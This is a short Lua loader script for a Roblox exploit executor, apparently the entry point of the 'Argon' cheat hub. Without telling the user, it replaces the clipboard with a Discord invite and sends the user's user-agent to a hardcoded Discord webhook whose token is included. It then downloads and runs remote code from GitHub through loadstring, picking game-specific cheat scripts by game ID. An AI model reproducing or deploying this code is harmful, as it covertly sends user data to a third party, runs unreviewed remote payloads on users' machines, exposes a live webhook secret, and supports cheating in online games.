repeat
    task.wait()
until game.GameId ~= nil
repeat
    task.wait()
until game:IsLoaded()

if getgenv().loaded then
    return
end
getgenv().loaded = true

universeid = game.GameId

setclipboard("https://dsc.gg/argonscripts")

local function getUserAgent()
    local response = request({
        Url = "https://httpbin.org/user-agent",
        Method = "GET",
    })
    local uaJson = response["Body"]
    local uaTable = game.HttpService:JSONDecode(uaJson)
    local userAgent = uaTable["user-agent"]
    return userAgent
end

agent = getUserAgent()

data = {content = agent}

request({
Url = "https://discord.com/api/webhooks/1284874020264607806/AItRSFmX9oB5Ici4Pv0Y5RByaqNKNMeW7dGBSC5F9DhGSejAad7j6ckXNNFhK0x_wD7W",
Method = "POST",
Headers = {
            ["Content-Type"] = "application/json"
        },
Body = game:GetService("HttpService"):JSONEncode(data)
})

pcall(function()
    if WebSocket.connect then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Argon/refs/heads/main/websocket.lua", true))()
    end
end)

if universeid == 920587237 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Argon/refs/heads/main/adm.lua", true))()
end

if universeid == 8737899170 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Argon/refs/heads/main/ps99.lua", true))()
end

if universeid == 6284583030 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Argon/refs/heads/main/Psx.lua", true))()
end
